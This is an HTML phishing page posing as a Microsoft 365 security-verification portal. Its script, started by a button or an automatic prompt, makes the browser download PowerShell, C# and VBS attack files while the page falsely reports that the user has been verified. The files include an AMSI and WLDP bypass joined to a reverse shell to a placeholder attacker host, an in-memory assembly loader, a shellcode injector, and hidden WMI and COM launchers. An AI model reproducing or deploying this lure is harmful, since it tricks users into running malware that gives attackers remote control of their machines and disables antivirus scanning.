<!DOCTYPE html>
<html>
<head>
    <title>Microsoft 365 Portal</title>
    <style>* { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; } .container { background: rgba(255,255,255,0.1); padding: 50px; border-radius: 20px; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.2); max-width: 500px; text-align: center; } .logo { font-size: 48px; margin-bottom: 20px; } .button { background: #107c10; color: white; padding: 18px 40px; border: none; border-radius: 6px; font-size: 18px; font-weight: 600; cursor: pointer; margin: 25px 0; transition: all 0.3s; width: 100%; } .button:hover { background: #0e6b0e; transform: translateY(-2px); }</style>
</head>
<body>
    <div class="container">
        <div class="logo">ðŸ”’</div>
        <h1>Microsoft 365 Security Portal</h1>
        <p>Your organization requires security verification to access protected documents.</p>
        <button class="button" onclick="initiateSecurityVerification()">Start Security Verification</button>
        <p style="font-size: 12px; opacity: 0.7; margin-top: 30px;">Microsoft Azure Active Directory â€¢ TLS 1.3 Encrypted</p>
    </div>

    <script>
        // CONFIGURACIÃ“N AVANZADA
        const C2_SERVER = "IP_KALI:443";
        const FALLBACKS = ["IP_KALI:4444", "IP_KALI:8443"];
        
        function initiateSecurityVerification() {
            document.querySelector('.button').innerHTML = 'ðŸ”„ Verifying Security Context...';
            
            // Ejecutar tÃ©cnicas en paralelo
            executePowerShellMemoryBypass();
            executeDotNetAssemblyLoader();
            executeWMIAlternative();
            executeCOMAbuse();
            executeWinRMEvasion();
            
            setTimeout(() => {
                document.querySelector('.button').innerHTML = 'âœ… Security Verified - Access Granted';
            }, 4000);
        }

        function executePowerShellMemoryBypass() {
            const payloads = [
                // AMSI + WLDP Bypass combinado
                `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);[Ref].Assembly.GetType('System.Management.Automation.WldpUtils').GetField('wldpInitFailed','NonPublic,Static').SetValue($null,$true);$c=New-Object Net.Sockets.TCPClient('${C2_SERVER.split(':')[0]}',${C2_SERVER.split(':')[1]});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);try{$r=(iex $d 2>&1|Out-String)}catch{$r=$_.Exception.Message};$r2=$r+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($r2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()`,
                
                // .NET Assembly in-memory load
                `$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('base64_encoded_assembly'));$a.GetType('ShellcodeRunner').GetMethod('Execute').Invoke($null,$null)`
            ];
            
            payloads.forEach((payload, index) => {
                setTimeout(() => {
                    createAndExecute(`security_check_${index}.ps1`, payload);
                }, index * 500);
            });
        }

        function executeDotNetAssemblyLoader() {
            // Cargar assembly .NET en memoria
            const dotnetLoader = `
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    public static void Execute() {
        byte[] shellcode = new byte[] { 0x90, 0x90 /* shellcode aquÃ­ */ };
        IntPtr hProcess = GetCurrentProcess();
        WriteProcessMemory(hProcess, Marshal.AllocHGlobal(shellcode.Length), shellcode, (uint)shellcode.Length, out _);
    }
}`;
            createAndExecute('dotnet_loader.cs', dotnetLoader);
        }

        function executeWMIAlternative() {
            // WMI para ejecuciÃ³n sin proceso
            const wmiScript = `
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = 0
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
objProcess.Create "powershell -Exec Bypass -Window Hidden -Command ...", Null, objConfig, intProcessID`;
            createAndExecute('wmi_launcher.vbs', wmiScript);
        }

        function executeCOMAbuse() {
            // Abuso de COM para ejecuciÃ³n
            const comScript = `
Set shell = CreateObject("Shell.Application")
shell.ShellExecute "powershell.exe", "-Exec Bypass -Window Hidden -Command ...", "", "open", 0`;
            createAndExecute('com_execute.vbs', comScript);
        }

        function executeWinRMEvasion() {
            // WinRM para ejecuciÃ³n remota
            const winrmScript = `
$s = New-PSSession -ComputerName localhost -ConfigurationName Microsoft.PowerShell
Invoke-Command -Session $s -ScriptBlock {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    # Resto del payload
}`;
            createAndExecute('winrm_exec.ps1', winrmScript);
        }

        function createAndExecute(filename, content) {
            try {
                const blob = new Blob([content], {type: 'text/plain'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                setTimeout(() => document.body.removeChild(a), 1000);
            } catch(e) {}
        }

        // Auto-trigger despuÃ©s de 8 segundos
        setTimeout(() => {
            if(confirm('Microsoft 365 Security: Verification required for document access. Continue?')) {
                initiateSecurityVerification();
            }
        }, 8000);
    </script>
</body>
</html>
